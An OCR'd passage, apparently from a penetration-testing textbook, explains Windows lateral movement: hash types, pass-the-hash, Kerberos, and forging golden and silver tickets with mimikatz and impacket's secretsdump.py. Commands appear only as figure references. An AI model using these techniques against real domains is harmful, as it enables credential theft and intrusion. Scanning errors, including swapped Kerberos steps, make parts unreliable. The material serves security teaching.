The secretsdump.py script in impacket implements the funetion of extracting the
password hash from ntds.dit using the boot key in system, with the following
command (see Fig. 12.57 for the results).

are often used in Windows lateral movement are introduced, including their princi-
ples involved and how they are exploited. The test environment is as follows.

12.5.1 Hash Passing
You need to understand the differences between LM Hash for Windows, NTLM
Hash, and Net NTLM Hash before you can do a hash pass.
(1) LM Hash: Only used by old version of Windows system (such as Windows
XP/2003 or below) to authentication. In order to ensure system compatibility,
Microsoft still retains it in the operating system after Windows Vista, but LM
authentication is disabled by default, LM authentication protocol is basically
eliminated, and NTLM is used for authentication.
(2) NTLM Hash: Mainly used by Windows Vista and newer systems, NTLM is a
network authentication protocol that requires NTLM Hash as credentials during
the authentication. During the prcess of local authentication, the plaintext pass-
word entered by the user is encrypted and converted into NTLM Hash for
comparison with NTLM Hash in the system SAM file. After capture, it can be
used directly for hash passing or cracked in objectif-securite, see Fig. 12.59.
(3) Net NTLM Hash: Is mainly used for various network authentication. Due to
different encryption methods, it derived into different versions, such as
NetNTLMv1, NetNTLMv1ESS, NetNTLMv2. Almost all Hash stolen through
fishing and other methods is of this type. Note that Net NTLM Hash cannot be
used directly for hash delivery, but can be exploited via smb relay.
Of course, all three of these hashes can be cracked by brute force, and if Hashcat is
supported by the hardware, the blasting speed will be very impressive.
When performing intranet penetration, when we get a user’s NTLM hash, though
we cannot get a plaintext password, it can still be exploited through hash passing.
Note that Microsoft released the patch KB2871997 on May 13, 2014 for Hash
passing, which was used to disable local administrator accounts for remote connec-
tions so that local administrators cannot execute wmi, psexec, etc. on remote hosts
with local administrator privileges. However, in real-world testing, it was found that
common hash passing no longer works, except for the default administrator (sid 500)
account, which can still perform hash passing attacks even if it is renamed.

12.5.2Passing ofTickets
12.5.2.1 Kerberos Authentication
The Kerberos protocol needs to be briefly introduced before Pass The Ticket. In a
domain environment, the Kerberos protocol is used for authentication, and
Fig. 12.62 shows a simple authentication process.
•KDC (Key Distribution Center): Key distribution center that contains AS and
TGS services.
---
## Page 792
12.5 Lateral Movement
781
*AS (Authentication Server): Authentication service.
TGS (Ticket Granting Server): Ticket Granting Service.
• TGT (Ticket Granting Ticket): After authentication, this file is granted to a user
for data traffic protection by the key distribution center (KDC) subsystem of
authentication services. It is stored in memory, and be valid for 10 hours by
default.
In general, the domain controller is the KDC, which uses the NTLM Hash of the
krbtgt account as the key, and the krbtgt account registers an SPN (Service Principal
Name). The SPN is a unique identifier in the network where the service uses
Kerberos to authenticate, it consists of service class, host name, and port. In a
domain, all machine names are registered as SPNs by default, and Kerberos authen-
tication is automatically used when accessing an SPN, which is why using a domain
administrator to access other machines in the domain does not require an account
password.
After the user enters their password, authentication is performed (see Fig. 12.62),
the process is as follows.
(1) AS-REQ: Uses the NTLM Hash converted from password as a key to encrypt
timestamp, and use the ciphertext as credentials to initiate requests to the AS
(including plaintext usernames).
(2) AS-REP: KDC uses the NTLM Hash for corresponding user to decrypt the
request, and retums the TGT ticket encrypted with the KDC key (krbtgt hash) if
the decryption is correct.
(3) TGS-REQ: The user uses the retumed TGT ticket to initiate a request to KDC for
(4) TGS-REP: Decrypt the request using the KDC key, and if the result is correct,
a specific service.
encrypt the TGS ticket using the target service’s account Hash and return it
(no permission verification, return the TGS ticket as long as the TGT ticket is
correct).
(5) AP-REQ: The user sends TGS tickets to the service.
(6) AP-REP: The service decrypts ST using its own NTLM Hash.
The principle of ticket passing is to get a ticket and import it into memory, so that
you can impersonate the user to gain access to it. Next, we will introduce the
generation and use of two commonly used Tickets.
12.5.2.2 Golden Tickets
Every user's ticket is encrypted with krbtgt’s NTLM Hash, and if we have krbtgt’s
Hash, we can forge ticket for arbitray user. When we get domain controller’s access,
we can use krbtgt’s Hash and mimikatz to generate a ticket for arbitray user, which is
called a Golden Ticket. Since it is a forged TGT, it does not communicate with
KDC's AS and is therefore sent to the domain controller as part of the TGS-REQ to
obtain a service ticket, see Fig. 12.63.

There is detailed help for using the above commands on the reference page, so I
won’t go into too much detail here. The following aspects need to be considered
when using Golden Tickets.
•The domain Kerberos policy trusts by default the expiration time of the ticket.
•The krbtgt password has been changed twice in a row and the golden ticket is
invalid.
Golden tickets can be generated and used on any host that can communicate with
the domain controller.

12.5.2.3 Silver Tickets
Silver Tickets is to use forged TGS Tickets to access services on a particular server.
The communication flow is shown in Fig. 12.66, which has the advantage that only
users and services communicate without communicating with the domain controller
(KDC), and no logs on the domain controller can be used as a backdoor for privilege
maintenance.
The difference between gold and silver tickets are shown in Table 12.1.
In other words, if you have a silver ticket in your hand, you can skip the KDC
authentication, and you can directly use the specified services. The list of services
can be accessed with the Silver Ticket are shown in Table 12.2.
Assuming you have already obtained the domain controller*s privileges, and you
happen to be able to communicate when the domain controller when the privileges
are lost. So you need to access the CIFS service (used for file sharing between
Windows hosts) on the domain controller to regain the privileges. The following
information is needed to generate a silver ticket: /domain, /sid, /target (the full name
of the domain name of the target server, in this casethe full name of the domain
controller), /service (the service need to be accessedon the target server, here CIFS), /

The result is shown in Fig. 12.68. After a successful import, you can now
successfully access the files share on the domain controller, see Fig. 12.69.
You can also get krbtgt hash to generate a golden ticket by accesing the LDAP
service on the domain controller with a silver ticket, just change the name of /service
to LDAP, generate and import the ticket as shown in Fig. 12.70.
Readers can test it by yourself (clearing the previously generated CIFS service
ticket before generating an LDAP service ticket) to see if you can access the domain
controller’s file sharing service at this time.
